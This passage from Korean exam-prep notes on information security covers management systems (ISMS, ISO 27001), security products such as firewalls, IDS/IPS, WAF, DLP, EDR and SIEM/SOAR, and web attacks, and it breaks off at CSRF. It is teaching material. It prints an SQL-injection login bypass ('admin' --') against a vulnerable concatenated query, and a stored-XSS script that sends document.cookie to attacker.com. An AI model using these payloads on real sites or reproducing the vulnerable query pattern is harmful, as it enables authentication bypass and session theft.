- **BCP(Business Continuity Plan, 업무 연속성 계획)**: 재해·장애 상황에서도 핵심 업무가 끊기지 않게 하는 종합 계획. 사람·프로세스·시스템·외부 협력까지 포함
- **DRP(Disaster Recovery Plan, 재해 복구 계획)**: BCP의 한 갈래, IT 시스템 복구에 초점을 맞춘 세부 계획

RTO·RPO는 BCP·DRP를 세울 때 시스템마다 따로 산정해서, 백업 주기·이중화 수준·재해 복구 센터(DR Site) 등급을 정하는 근거가 된다.

### 관리체계

#### ISMS (Information Security Management System)
**ISMS**는 조직의 정보자산을 보호하려고 구축·운영하는 **정보보호 관리체계**다. 기술만 들여놓는 것이 아니라, 정책 수립 → 실행 → 점검 → 개선의 사이클로 조직 전체가 체계적으로 정보보호를 운영하게 만드는 프레임워크다.

- 주관 기관: 국내는 KISA(한국인터넷진흥원)가 ISMS 인증 운영
- 인증 대상: 주요 정보통신서비스 제공자, 일정 규모 이상의 기업
- 인증 절차: 신청 → 예비 점검 → 심사 → 인증위원회 심의 → 인증서 발급 (3년 유효, 매년 사후관리)
- 구성: 관리체계 수립·운영 16개 항목 + 보호대책 64개 항목

ISMS는 Information Security Management System의 약어다. 시험에서는 약어를 주고 풀네임을 묻거나, 풀네임을 주고 약어를 쓰라는 단답형으로 자주 나온다.

#### ISMS-P
**ISMS-P(Personal Information & Information Security Management System)**는 기존 ISMS에 개인정보보호(Privacy) 요구사항을 합친 확장 인증이다. 2018년 11월에 ISMS와 PIMS(Personal Information Management System)가 통합되어 출범했다.

| 인증 | 보호 대상 | 인증 영역 |
|---|---|---|
| ISMS | 정보자산 전반 | 관리체계 + 보호대책 |
| ISMS-P | 정보자산 + 개인정보 | 관리체계 + 보호대책 + 개인정보 처리단계별 요구사항 |

- ISMS-P는 ISMS의 상위 개념. 개인정보를 대량 처리하는 기업(쇼핑몰·포털·통신사 등)은 ISMS-P를 받는 것이 일반적
- P는 Privacy(개인정보)

#### ISO/IEC 27001
**ISO/IEC 27001**은 국제표준화기구(ISO)와 국제전기기술위원회(IEC)가 함께 만든 국제 정보보안 관리 표준이다. ISMS의 국제 버전에 해당하고, 어느 나라 조직이든 공통으로 따를 수 있는 프레임워크를 제공한다.

- 핵심 구조: PDCA 사이클 (Plan-Do-Check-Act), 계획 → 실행 → 점검 → 개선의 순환
- Annex A: 구체적 통제 항목 114개 (2013년판 기준, 2022년 개정판은 93개)
- 국내 ISMS와의 관계: 상호 인정되지는 않지만 구조와 통제 항목이 상당히 겹쳐 함께 추진하는 기업이 많음

```mermaid
제목: 계획 → 실행 → 점검 → 개선이 끝없이 도는 고리
flowchart LR
  P("Plan (계획)") --> D("Do (실행)") --> C("Check (점검)") --> A("Act (개선)") --> P
```

## 보안 솔루션 (방화벽·IDS·IPS·SIEM·DRM)
출제: 23-2, 22-3
형태: 설명 한두 줄 → 용어(SIEM은 영문 약자, 템퍼프루핑은 한글)

### 개념
보안 솔루션은 지키는 대상에 따라 세 계열로 나눠 보면 편하다. 네트워크 경계와 내부망의 트래픽을 지키는 네트워크 방어 솔루션, 데이터 자체를 지키는 데이터 보호 솔루션, 공격을 탐지하고 대응하는 탐지·대응 솔루션이다. 이 순서대로 본다.

### 네트워크 방어 솔루션
네트워크 방어 솔루션은 네트워크 경계나 내부망에서 트래픽 흐름을 감시·차단해 공격을 막는 보안 장비들이다. 트래픽(Traffic)이란 네트워크에서 오가는 데이터의 흐름으로, 웹페이지 요청·이메일 송수신·파일 다운로드 같은 모든 통신이 패킷 단위 트래픽으로 전달되고 보안 장비는 이 트래픽을 검사해 공격 여부를 판단한다. 외부에서 내부로 들어오는 경로를 어디서 어떻게 막느냐에 따라 솔루션이 나뉜다.

- 트래픽 기본 차단: 방화벽
- 침입 탐지·차단: IDS, IPS
- 웹 공격 전용: WAF
- 통합 장비: UTM
- 내부망 접속 통제: NAC
- 원칙·아키텍처: Zero Trust

솔루션마다 동작 계층(L3/L4 vs L7)과 역할(탐지 전용 vs 차단까지)이 다르다. 이 두 축으로 구분해 두면 헷갈리지 않는다.

| 솔루션 | 영문 | 동작 계층 | 한 줄 정리 |
|---|---|---|---|
| 방화벽 | Firewall | L3 ~ L4 | IP·포트 기반 트래픽 차단 (가장 기본) |
| IDS | Intrusion Detection System | L3 ~ L7 | 침입을 탐지만 하고 경고 발송 |
| IPS | Intrusion Prevention System | L3 ~ L7 | 침입을 탐지 + 자동 차단 |
| WAF | Web Application Firewall | L7 (웹) | SQL Injection · XSS 등 웹 공격 차단 |
| UTM | Unified Threat Management | 통합 | 방화벽·IPS·백신·VPN을 한 장비에 통합 |
| NAC | Network Access Control | 접속 제어 | 내부망 접속 단말의 자격 검사 후 허용 |
| Zero Trust | Zero Trust Architecture | 아키텍처 | "내부도 신뢰하지 않음" 원칙, 모든 접근 재검증 |

```mermaid
제목: 방화벽·IDS/IPS·WAF·NAC이 외부에서 내부로 들어오는 경로에 계층별로 배치된다
%% 폰: TB
flowchart LR
  I("인터넷") --> F("방화벽<br>IP·포트")
  F -.->|"복사본(미러링)"| D("IDS")
  F --> P("IPS")
  P --> W("WAF<br>웹서버 앞")
  P --> N("NAC<br>내부망 접속 지점")
  W --> L("내부망")
  N --> L
```

#### 1. 방화벽 (Firewall)
**방화벽**은 네트워크 경계에서 IP 주소·포트·프로토콜 정보를 보고 트래픽을 허용하거나 차단하는 가장 기본적인 보안 장비다. 동작은 단순하다. 관리자가 "어떤 출발지 IP에서 어떤 목적지 포트로 들어오는 트래픽은 허용/차단"이라는 규칙 목록(정책 테이블)을 미리 만들어 두면, 방화벽이 패킷마다 이 목록을 위에서 아래로 훑어 일치하는 규칙대로 처리한다. 일치하는 규칙이 없으면 기본 정책(보통 차단)이 적용된다.

| 처리 | 대상 | 비고 |
|---|---|---|
| 허용 | HTTP 트래픽 (목적지 포트 80, 443) | 웹 서비스용 |
| 허용 | 사내 관리자 IP 대역 | SSH(22번 포트) |
| 차단 | 그 외 모든 외부 IP | SSH |

- 동작 계층: 네트워크 계층(L3) ~ 전송 계층(L4)
- 한계: 허용된 포트(예: 80, 443)로 들어오는 공격은 내용을 보지 않으므로 못 막음 → WAF·IPS가 보완

#### 2. IDS (Intrusion Detection System)
**IDS**는 네트워크를 지나는 패킷을 분석해 공격 패턴이 보이면 관리자에게 경고만 보내는 탐지 전용 장비다.

- 핵심 키워드: 탐지만 함, 차단은 안 함
- 배치: 주요 구간에서 미러링으로 트래픽 복사본을 받아 분석 (실제 트래픽 흐름에 영향 없음)

미러링(Mirroring)은 네트워크 스위치가 특정 포트를 지나는 트래픽의 복사본을 다른 포트로 보내 주는 기능이다. 이 덕분에 IDS는 실제 흐름을 건드리지 않고 분석할 수 있다.

#### 3. IPS (Intrusion Prevention System)
**IPS**는 IDS가 경고만 보내던 한계를 넘어, 공격을 탐지하는 동시에 자동으로 차단한다.

- IDS와의 차이: 능동적 차단 여부. IDS = 탐지, IPS = 탐지 + 차단
- 배치: 트래픽이 반드시 IPS를 거쳐야 하므로 인라인(In-line)으로 설치

한 줄로 가르면 IDS는 '경고만' 보내고 IPS는 '차단도' 한다. 이름의 'Prevention'이 차단이라고 기억하면 된다.

#### 4. WAF (Web Application Firewall)
**WAF**는 웹 애플리케이션 계층(L7)의 공격을 전문으로 막는 방화벽이다.

- 차단 대상: SQL Injection, XSS, CSRF, 파일 업로드 취약점 공격
- 방화벽과의 차이: 일반 방화벽은 포트만 보지만, WAF는 HTTP 요청의 본문·파라미터 내용까지 검사
- 관련 규정: 전자금융거래법 등에서 WAF 설치를 요구하는 경우가 많음

```mermaid
제목: 일반 방화벽은 '문(포트)'만 보고, WAF는 '편지(HTTP 본문)'를 열어 검사한다
%% 폰: TB / LR
flowchart LR
  subgraph WA["WAF: HTTP 본문까지 검사"]
    direction LR
    Q2("SELECT * FROM users<br>든 요청") -->|"본문 검사"| X2("차단")
  end
  subgraph FW["일반 방화벽: IP와 포트만 확인"]
    direction LR
    Q1("SELECT * FROM users<br>든 요청") -->|"포트 80 확인"| O1("통과")
  end
```

#### 5. UTM (Unified Threat Management)
**UTM(통합 위협 관리)**은 방화벽·IPS·안티바이러스·VPN·스팸 필터 같은 여러 보안 기능을 장비 하나에 합친 솔루션이다.

- 장점: 중소기업도 여러 장비 없이 한 장비로 다층 방어 구성 가능
- 단점: 부하가 한 장비에 몰려 성능 병목 발생 가능

#### 6. NAC (Network Access Control)
**NAC(네트워크 접근 제어)**는 내부망에 접속하려는 단말(PC, 모바일, IoT)을 검사해서 자격을 갖춘 단말만 접속을 허용하는 솔루션이다. 내부망 입구에서 단말의 건강 상태를 점검하는 출입 관리자라고 보면 된다.

- 검사 항목: 백신 설치 여부, 최신 보안 패치 적용 여부, MAC 주소 등록 여부
- 활용: 외부 노트북이 사내망에 연결되면 NAC이 점검 후 미흡하면 격리망으로 이동
- 방화벽과의 차이: 방화벽은 외부 → 내부 트래픽을 통제, NAC은 내부망 접속 단말 자체를 통제

```mermaid
제목: NAC은 내부망 입구에서 단말을 점검해 통과시키거나 격리망으로 보낸다
flowchart LR
  T("단말<br>PC·모바일·IoT") --> C{"NAC 점검<br>백신·패치·MAC 등록"}
  C -->|"자격 충족"| L("내부망")
  C -->|"미흡"| Q("격리망")
```

#### 7. Zero Trust
**Zero Trust(제로트러스트)**는 특정 솔루션이 아니라 "내부망도 믿지 않고 모든 접근을 매번 검증한다"는 보안 원칙·아키텍처다. 위 솔루션들을 이 원칙 위에서 조합해 운영한다.

- 기존 경계 보안: "내부는 안전, 외부는 위험" → 한 번 들어오면 내부는 자유롭게 이동 가능 → APT의 내부 이동에 무력
- 제로트러스트: 파일 서버 접근, DB 조회 등 모든 접근마다 사용자·기기·시간대·위치를 재검증, 의심되면 MFA 추가 요구 (MFA: 비밀번호 외에 OTP·지문·얼굴인식 등 추가 인증 수단을 결합한 다중 인증, 제로트러스트 환경에서 필수)

3대 원칙은 이렇다.

- **모든 트래픽 검증**: 내부·외부 구분 없이 전부 검사
- **최소 권한 부여**: 필요한 자원에만 최소한으로 접근 허용
- **침해 가정(Assume Breach)**: "이미 뚫렸다"는 전제로 다층 방어 설계

제로트러스트는 '제품'이 아니라 '원칙'이다. 시험에 'Zero Trust 장비를 설치한다' 같은 표현이 나오면 오답일 가능성이 높다. 방화벽·NAC·MFA·EDR을 이 원칙에 맞게 조합·운영하는 아키텍처 개념이기 때문이다.

#### 헷갈리기 쉬운 세 쌍
방화벽 vs WAF, IDS vs IPS, 방화벽 vs NAC. 이 세 쌍은 역할이 비슷해 보여 헷갈리기 쉬우니 비교 포인트를 표로 정리해 둔다.

방화벽 vs WAF는 계층과 검사 대상이 다르다.

| 구분 | 방화벽 | WAF |
|---|---|---|
| 동작 계층 | L3 ~ L4 | L7 (웹) |
| 검사 대상 | IP·포트·프로토콜 | HTTP 본문·파라미터 |
| 차단 공격 | 허용되지 않은 포트·IP 접근 | SQL Injection·XSS·CSRF 등 웹 공격 |
| 비유 | "문(포트)"만 검사 | "편지(HTTP 본문)"를 열어 검사 |

IDS vs IPS는 차단 여부가 다르다.

| 구분 | IDS | IPS |
|---|---|---|
| 역할 | 탐지만, 관리자에게 경고 | 탐지 + 자동 차단 |
| 배치 방식 | 미러링 (트래픽 복사본 분석) | 인라인 (트래픽이 직접 통과) |
| 트래픽 흐름 영향 | 없음 | 차단 시 흐름 변경 |
| 이름의 단서 | Detection = 탐지 | Prevention = 예방·차단 |

방화벽 vs NAC은 통제 대상이 트래픽이냐 단말이냐로 다르다.

| 구분 | 방화벽 | NAC |
|---|---|---|
| 통제 대상 | 외부 → 내부 트래픽 | 내부망 접속 단말 자체 |
| 검사 항목 | IP·포트·프로토콜 | 백신 설치·보안 패치·MAC 등록 |
| 배치 위치 | 네트워크 경계 | 내부망 접속 지점 |
| 차단 예시 | 허용 안 된 포트로 들어오는 패킷 | 보안 패치 안 된 노트북의 내부망 접속 |

### 데이터 보호 솔루션
데이터 보호 솔루션은 네트워크가 아니라 데이터 자체를 지키는 보안 도구다. 외부 해커의 침투를 막는 것이 네트워크 방어 솔루션의 몫이라면, 데이터 보호 솔루션은 이미 안에 있는 데이터가 밖으로 새거나 무단으로 쓰이는 상황을 막는다.

- 유출 경로 감시·차단: DLP (Data Loss Prevention)
- 문서 자체에 권한 심기: DRM (Digital Rights Management)

내부자 유출, 퇴사자의 자료 반출, 외주 협력사의 기밀 유출처럼 "사람이 정상 권한으로 데이터에 접근한 뒤 밖으로 빼내는" 위협이 주 대응 대상이다.

| 솔루션 | 영문 | 보호 방식 | 한 줄 정리 |
|---|---|---|---|
| DLP | Data Loss Prevention | 유출 경로 감시 | 민감 데이터의 외부 유출을 탐지·차단 |
| DRM | Digital Rights Management | 파일 내 권한 제어 | 문서·콘텐츠 자체에 복사·인쇄·공유 제한 적용 |
| 템퍼프루핑 | Tamperproofing | 위·변조 감지 시 자가 차단 | 변조가 감지되면 코드 변형·실행 중단으로 무결성 보호 |

```mermaid
제목: DLP는 '문 앞 검문', DRM은 '문서에 자물쇠 부착'
%% 폰: TB / LR
flowchart LR
  subgraph RM["DRM: 문서 자물쇠"]
    direction LR
    R1("자물쇠 달린 문서") -->|"밖으로 나가도"| R2("허가 없이는 안 열림")
  end
  subgraph LP["DLP: 문 앞 검문"]
    direction LR

    L2 -->|"민감 데이터"| L3("차단")
  end
```

#### 1. DLP (Data Loss Prevention)
**DLP(데이터 유출 방지)**는 내부의 민감 데이터(주민번호·카드번호·기밀 문서 등)가 외부로 나가는 것을 탐지·차단한다.

- 탐지 경로: 이메일 첨부, 웹 업로드, USB 복사, 클라우드 동기화, 메신저 전송 등 모든 유출 경로
- 동작 방식: 파일 내용을 패턴 매칭·지문(Fingerprint) 방식으로 검사, 민감 정보가 있으면 차단 또는 관리자 승인 요구
- 활용 예: "주민등록번호 형태의 13자리 숫자가 든 엑셀 파일은 외부 이메일로 나갈 수 없음" 같은 정책

패턴 매칭(Pattern Matching)은 미리 정해 둔 규칙(정규식 등)으로 민감 정보의 형태를 찾는 방식이다. 13자리 숫자(주민등록번호 형태), 16자리 숫자 4묶음(카드번호 형태)이 들어 있는지 검사하는 식이다. 지문(Fingerprint) 방식은 보호 대상 파일에서 미리 뽑아 둔 고유 해시값(지문)을 저장해 두고 검사 대상 파일의 해시와 비교한다. 패턴 매칭이 "형태"로 잡는다면, 지문 방식은 "이 특정 기밀 문서 자체"가 통째로 또는 일부 들어 있는지 정확히 가려낸다.

```mermaid
제목: DLP는 사내 출구에서 모든 데이터 반출을 검문한다
flowchart LR
  E("이메일 · USB<br>클라우드 · 메신저") --> G{"DLP 검문소"}
  G -->|"주민번호·카드번호·기밀문서 패턴"| B("차단")
  G -->|"해당 없음"| P("통과")
```

#### 2. DRM (Digital Rights Management)
**DRM(디지털 권리 관리)**은 문서·콘텐츠에 암호화와 권한 제어를 적용해, 허가된 사용자만 읽기·복사·인쇄·공유를 할 수 있게 제한한다.

- 활용: 기업 내부 문서 유출 방지 (퇴사자가 USB로 가져가도 회사 밖에서는 안 열림), 유료 전자책·동영상 불법 복제 방지
- 동작 방식: DRM을 적용하면 파일 자체가 암호화되고, 열람할 때 DRM 서버에 권한을 확인해 허용된 사용자만 복호화해 사용
- DLP와의 차이: DLP는 유출을 탐지·차단, DRM은 파일 자체에 권한 제어를 심어 밖으로 나가도 못 열게 만듦

DLP는 '문 앞에서 검사'(유출 탐지), DRM은 '문서에 자물쇠 부착'(열람 권한 제어)이다. 유출된 뒤에도 안 열리게 하려면 DRM이다.

#### 3. 템퍼프루핑 (Tamperproofing)
**템퍼프루핑(Tamperproofing)**은 소프트웨어에 위·변조(Tampering)가 감지되면 실행 코드를 변형하거나 동작을 멈춰, 공격자가 소스 코드와 실행 파일을 분석·변경하지 못하게 막는 무결성 보호 기술이다. 이름 그대로 "조작(Tamper) + 방지(proof)"의 결합어다.

- 보호 목적: CIA 3요소 중 무결성(Integrity). "건드리면 깨지게 만들어 변조를 무의미하게 함"
- 대표 적용 분야: DRM 클라이언트, 모바일 게임 클라이언트, 결제·인증 SDK, 백신 엔진처럼 공격자가 직접 손대는 환경에서 실행되는 소프트웨어
- DRM과의 관계: DRM은 "허가된 사용자만 열게 함(권한 제어)", 템퍼프루핑은 "조작 자체를 막음(자기 방어)". 실제 제품에서는 함께 적용되는 경우가 많음

주요 기법은 넷이다.

- **체크섬·해시 자가 검증**: 실행 파일이 자기 해시를 계산해 원본과 비교, 다르면 종료
- **코드 난독화(Obfuscation)**: 정적 분석을 어렵게 만들어 변조 자체를 방해
- **안티 디버깅**: 디버거 부착이 감지되면 실행 거부 또는 자가 손상
- **자가 검증(Self-checksum) 코드 분산 삽입**: 곳곳에 무결성 검사 루틴을 흩뿌려 부분 우회 방지

정리하면 템퍼프루핑은 '깨지게 설계'하는 기술이다. 공격자가 실행 코드를 한 줄이라도 바꾸면 자기 검증에 실패해 동작을 멈추게 만드는 자기 방어 기법이고, 변조 감지 → 실행 중단·자기 손상이 핵심 흐름이다.

비슷한 용어 셋은 이렇게 구분한다.

- **워터마킹(Watermarking)**: 콘텐츠 안에 식별 표식 삽입, 누가 만든 것인지 증명
- **DRM(Digital Rights Management)**: 콘텐츠에 권한 제어 적용, 누가 어떻게 쓸지 통제
- **템퍼프루핑(Tamperproofing)**: 변조 자체를 탐지·차단, 소프트웨어 무결성 보호

### 탐지·대응 솔루션
탐지·대응 솔루션은 사이버 공격을 탐지(Detection)하고 대응(Response)하는 보안 도구 모음이다. 전통적인 시그니처 기반 백신(알려진 악성코드의 '지문' 패턴을 DB에 저장해 두고 일치하면 차단하는 백신, 신종 악성코드는 못 잡음)이 "알려진 악성코드 차단"에 그쳤다면, 이 솔루션들은 행위 기반 분석으로 알려지지 않은 공격까지 잡아내고 탐지 뒤 자동 대응까지 한다.

- 단말(엔드포인트) 중심: EDR, XDR, MDR
- 로그·이벤트 중심: SIEM, SOAR

APT·랜섬웨어처럼 백신을 우회하는 고도화된 공격이 늘면서 이 계열의 중요도가 커지고 있다.

| 솔루션 | 영문 | 무엇을 보는가 | 한 줄 정리 |
|---|---|---|---|
| EDR | Endpoint Detection and Response | 단말(PC·서버) | 행위 기반 실시간 분석으로 악성 활동 탐지·대응 |
| XDR | Extended Detection and Response | 단말 + 네트워크 + 이메일 + 클라우드 | EDR 확장판, 여러 영역 로그를 통합 상관 분석 |
| MDR | Managed Detection and Response | (위탁 서비스) | EDR/XDR을 전문 업체가 대신 운영해 주는 서비스 |
| SIEM | Security Information and Event Management | 전사 로그·이벤트 | 수많은 로그를 한곳에 모아 상관 분석·경고 |
| SOAR | Security Orchestration, Automation and Response | 경고 → 대응 절차 | 사전 정의된 플레이북으로 자동 대응 |

#### 1. EDR
**EDR**은 단말(PC, 노트북, 서버)의 프로세스 실행·파일 접근·레지스트리 변경 같은 행위 자체를 실시간으로 기록·분석해 악성 활동을 탐지·대응하는 솔루션이다. 단말이 영어로 Endpoint라서 앞 글자를 따 EDR(Endpoint Detection and Response)이라고 부른다.

- 탐지 방식: 시그니처 기반 백신과 달리 행위 기반, 알려지지 않은 공격까지 포착
- 대응: 악성 프로세스 자동 종료, 해당 단말을 네트워크에서 격리(Isolation)
- 주요 활용: APT·랜섬웨어처럼 백신을 우회하는 고도화된 공격 대응의 필수 도구

#### 2. XDR
**XDR**은 EDR의 확장판이다. 단말뿐 아니라 네트워크 장비·이메일 게이트웨이·클라우드·서버 로그까지 모두 모아 상관 분석한다. 확장이 영어로 eXtended라서 X를 따 XDR(eXtended Detection and Response)이 된다. EDR의 E(Endpoint, 단말)가 X(eXtended, 확장)로 바뀌었다고 보면 된다.

- 예시: EDR이 "PC에서 수상한 프로세스 발견"만 탐지한다면, XDR은 "그 프로세스가 이메일 첨부파일로 들어왔고 이후 외부 C2 서버와 통신 중"까지 한 화면에서 보여 줌
- EDR과의 차이: 시야 범위. EDR = 단말만, XDR = 단말 + 네트워크 + 이메일 + 클라우드 통합

이메일 게이트웨이(Email Gateway)는 조직에 들고 나는 모든 메일이 거쳐 가는 관문 서버로, 스팸·피싱·악성 첨부파일을 미리 차단·검사하고 이때 쌓이는 로그가 XDR의 분석 대상이 된다. C2(Command and Control)는 공격자가 감염된 단말을 원격으로 조종하고 명령을 내리는 공격용 서버다.

```mermaid
제목: EDR은 단말 한 대, XDR은 전체 IT 환경을 한눈에 본다
%% 폰: TB / LR
flowchart LR
  subgraph X["XDR: 통합 모니터링"]
    direction LR
    X1("단말") --> XM("XDR")
    X2("네트워크") --> XM
    X3("이메일") --> XM
    X4("클라우드") --> XM
  end
  subgraph E["EDR: 단말 감시"]
    direction LR
    E1("단말") --> EM("EDR")
  end
```

EDR은 '단말만' 보고, XDR은 '단말 + 네트워크 + 이메일 + 클라우드'를 통합해서 본다. 보기에 '통합 탐지'라는 말이 나오면 XDR이다.

#### 3. MDR
**MDR**은 EDR·XDR을 직접 운영할 인력이 없는 조직을 위해, 보안 전문 업체가 24시간 대신 모니터링·대응해 주는 위탁 서비스다. 관리(위탁) 운영이 영어로 Managed라서 M을 따 MDR(Managed Detection and Response)이라고 부른다.

- 도구가 아니라 서비스: EDR/XDR이 "장비"라면 MDR은 "장비 + 운영 인력"을 함께 제공
- 활용 대상: 자체 보안관제센터(SOC)를 갖추기 어려운 중소기업·공공기관

SOC(Security Operations Center)는 보안 이벤트를 24시간 모니터링·대응하는 보안관제센터다. 직접 구축하기 부담스러운 기업은 MDR 서비스로 대신한다.

#### 4. SIEM
**SIEM**은 조직 안의 모든 보안 장비·서버·애플리케이션의 로그와 이벤트를 한곳에 모아 상관 분석하는 솔루션이다. 이름 그대로 보안(Security) 정보(Information)와 이벤트(Event)를 관리(Management)하는 도구로, "정보·이벤트를 모아서 관리한다"가 핵심이다.

- 핵심 기능: 로그 수집 → 정규화 → 상관 분석 → 경고 발생 → 규정 준수 보고서
- 예시: "10초 안에 같은 IP에서 방화벽·VPN·ADFS 로그인 실패가 모두 발생" → 장비 하나의 로그만 보면 정상 범위지만, SIEM은 여러 장비를 엮어 이상 패턴으로 탐지
- 한계: 경고가 너무 많이 생겨 사람이 일일이 대응하기 어려움 → 그래서 SOAR와 함께 도입

예시의 ADFS(Active Directory Federation Services)는 기업 내 사용자 계정으로 외부 서비스에 로그인할 수 있게 해 주는 Microsoft의 통합 인증 서비스다.

#### 5. SOAR
**SOAR**는 SIEM 등이 만든 경고에 대해 미리 정해 둔 대응 절차(플레이북)를 자동으로 실행해 주는 솔루션이다. 보안(Security) 오케스트레이션(Orchestration)·자동화(Automation)·대응(Response)의 앞 글자를 땄다. 핵심은 가운데 A(Automation, 자동화)로, 한 줄로 줄이면 "여러 도구를 엮어 자동으로 대응한다"다. 여기서 오케스트레이션은 여러 보안 도구(방화벽·EDR·메신저 알림 등)를 한 흐름으로 엮어 순서대로 동작시키는 것으로, 오케스트라 지휘자가 여러 악기를 동시에 통솔하는 데 빗댄 말이다.

- 예시: "의심 IP 탐지 → 방화벽에 자동 차단 규칙 추가 → 관리자에게 슬랙 알림 → 관련 단말 격리"를 사람 개입 없이 몇 초 안에 수행
- SIEM과의 관계: SIEM이 "탐지"라면 SOAR는 "대응 자동화". 보통 SIEM + SOAR를 함께 도입

```mermaid
제목: SIEM이 경고를 만들면 SOAR가 플레이북대로 자동 대응한다
%% 폰: TB
flowchart LR
  L1("방화벽") --> S("SIEM (탐지)<br>이상 패턴 발견")
  L2("VPN") --> S
  L3("서버") --> S
  S -->|"경고"| O("SOAR (자동 대응)<br>플레이북")
  O --> A1("방화벽 차단")
  O --> A2("알림 발송")
  O --> A3("단말 격리")
```

SIEM은 '모아서 본다(탐지)', SOAR는 '자동으로 대응한다(플레이북)'. SIEM이 경고를 띄우면 SOAR가 정해진 순서대로 조치하는 2단 구조다.

## 웹 공격 (SQL Injection·XSS·CSRF)
출제: 20-2
형태: 설명 2줄(입력값 검증 미흡, 악의적 SQL 삽입) → 용어

### 개념
이 묶음은 웹을 매개로 한 공격을 본다. SQL Injection·XSS·CSRF·파일 업로드 공격은 웹 애플리케이션의 입력·세션 처리 취약점을 악용한다. 타이포스쿼팅은 오타 도메인을 선점해 방문자를 끌어들이는 수법이다. 표적이 찾는 사이트를 감염시키는 워터링 홀도 같은 웹 공격 범위에 들지만, 기출이 사회공학 문제와 함께 나와서 「사회공학·표적 공격·APT」 묶음에서 다룬다. 같은 웹 공격이라도 공격 지점은 저마다 다르다.

웹 애플리케이션 취약점의 대표 분류 기준은 OWASP Top 10이다. 먼저 취약점을 악용하는 공격 4종을 비교하면 이렇다.

| 공격 | 공격 대상 | 원리 한 줄 요약 | 핵심 대응 |
|---|---|---|---|
| SQL Injection (SQLi) | DB 질의 | 입력에 SQL 구문을 섞어 원래 질의를 조작 | Prepared Statement |
| XSS (Cross-Site Scripting) | 다른 사용자의 브라우저 | 웹페이지에 악성 스크립트를 심어 피해자 브라우저에서 실행 | HTML 이스케이프, CSP |
| CSRF (Cross-Site Request Forgery) | 피해자의 인증 세션 | 피해자 브라우저가 공격자 의도대로 정상처럼 보이는 요청을 보내게 함 | CSRF 토큰, SameSite 쿠키 |
| 파일 업로드 취약점 | 서버 파일시스템 | 확장자·MIME 검증 우회로 웹쉘 업로드 → 서버 장악 | 확장자 화이트리스트, 실행 권한 분리 |

입력 경로에 `../`를 끼워 웹 루트 밖 파일을 읽는 디렉터리 트래버설(Directory Traversal / Path Traversal)도 OWASP Top 10에 자주 거론된다. 하지만 본질은 소프트웨어 개발 보안의 경로 조작과 같은 취약점이라 「SW 개발 보안 취약점」 묶음에서 한 번에 정리한다.

### 웹 공격 하나씩 보기

#### 1. 타이포스쿼팅 (Typosquatting)
**타이포스쿼팅**은 사용자가 주소를 잘못 입력하는 실수를 노려, 유명 사이트와 철자가 비슷한 도메인을 미리 등록해 두는 수법이다. URL 하이재킹이라고도 하고, 잘못 들어온 사용자에게 광고를 보여 주거나 피싱·악성코드 배포에 악용한다.

- 예시: gogle.com처럼 유명 도메인의 오타 형태를 선점해 방문자 유인
- 사이버스쿼팅과의 관계: 유명 상표·기업명 관련 도메인을 선점하는 사이버스쿼팅 가운데 오타를 이용하는 방식
- 대응: 서비스 운영자는 주요 오타 도메인을 방어적으로 등록, 사용자는 접속 주소의 철자 확인. HTTPS 자물쇠만으로 진짜 사이트인지 판단 불가

타이포스쿼팅은 도메인 이름을 이용한 유인 수법이지, SQL Injection·XSS처럼 웹 애플리케이션 취약점의 이름이 아니다. 22-3 문제에서 함께 나온 다른 정답 TrustZone은 하드웨어 보안 기술로, 「보안 신기술 용어」 묶음에 있다.

#### 2. SQL 삽입 (SQL Injection)
**SQL Injection(SQL 삽입)**은 사용자 입력을 SQL 질의문에 그대로 끼워 넣을 때, 공격자가 입력에 SQL 구문을 섞어 원래 질의의 의미를 바꿔 버리는 공격이다. 인증 우회·DB 전체 유출·테이블 삭제까지 가능해서 가장 위협적인 웹 공격으로 꼽힌다.

위험한 질의 구조부터 보자. 사용자가 입력한 값을 문자열로 이어 붙여 질의를 만든다.

```java
// user_id, password가 사용자 입력
String sql = "SELECT * FROM users WHERE id = '" + user_id + "' AND pw = '" + password + "'";
```

공격자가 `user_id` 자리에 `admin' --`을 입력하면 질의는 이렇게 된다.

```sql
SELECT * FROM users WHERE id = 'admin' --' AND pw = '아무거나'
```

SQL에서 `--`는 주석 시작 기호다. 그래서 그 뒤의 ` AND pw = '아무거나'` 부분이 통째로 주석이 되어 사라지고, DB가 실제로 실행하는 질의는 다음과 같다.

```sql
SELECT * FROM users WHERE id = 'admin'
```

비밀번호 조건이 없어졌으니 users 테이블에서 id가 admin인 행이 그대로 반환된다. 애플리케이션은 "admin 계정이 인증됐다"고 판단하고, 비밀번호 없이 admin 계정 로그인을 통과시킨다. 신청서(쿼리)에 몰래 끼워 넣은 SQL 한 줄이 자물쇠를 통째로 풀어 버리는 셈이다.

#### 3. XSS (Cross-Site Scripting)
**XSS(Cross-Site Scripting, 크로스 사이트 스크립팅)**는 공격자가 웹페이지에 악성 자바스크립트를 심어, 그 페이지를 방문한 다른 사용자의 브라우저에서 스크립트가 실행되게 하는 공격이다. 피해자의 쿠키·세션 토큰을 빼내거나 피해자 계정으로 임의 요청을 보낼 수 있다.

이름이 CSS가 아니라 XSS인 데는 이유가 있다. Cross-Site Scripting을 그대로 줄이면 CSS인데, CSS는 이미 Cascading Style Sheets(웹 스타일링 언어)가 쓰는 약자라 충돌을 피하려고 Cross의 C 대신 X를 쓴다. 영어권에서 X가 "cross"를 대신하는 기호로 종종 쓰이기 때문이다(예: Xmas = Christmas, Xing = Crossing). CSRF의 C는 겹치는 약자가 없어 그대로 두었다.

유형은 스크립트가 어디에 저장되고 언제 실행되느냐에 따라 셋이다.

| 유형 | 저장 위치 | 트리거 |
|---|---|---|
| Reflected XSS (반사형) | 저장되지 않음 | URL 파라미터에 악성 스크립트 → 피해자가 그 링크를 클릭하면 실행 |
| Stored XSS (저장형) | 서버 DB | 게시판·댓글에 스크립트 저장 → 방문자가 볼 때마다 실행 |
| DOM-based XSS | 없음 (클라이언트 전용) | 서버를 거치지 않고 클라이언트 스크립트가 innerHTML 등으로 직접 DOM에 삽입 |

게시글에 이런 스크립트를 저장해 두는 것이 저장형의 예다.

```html
<!-- 게시글에 저장된 악성 스크립트 -->
<script>fetch('https://attacker.com/?c=' + document.cookie);</script>
```

방문자가 이 게시글을 열 때마다 스크립트가 실행되어 세션 쿠키가 공격자 서버로 전송된다.

```mermaid
제목: 게시판에 심어 둔 스크립트가 방문자 브라우저에서 실행되고 쿠키가 공격자에게 날아간다
flowchart LR
  A("공격자") -->|"script 저장"| B("게시판")
  B -->|"게시글 열람"| V("방문자 브라우저<br>스크립트 실행")
  V -->|"쿠키 전송"| A
```

#### 4. CSRF (Cross-Site Request Forgery)
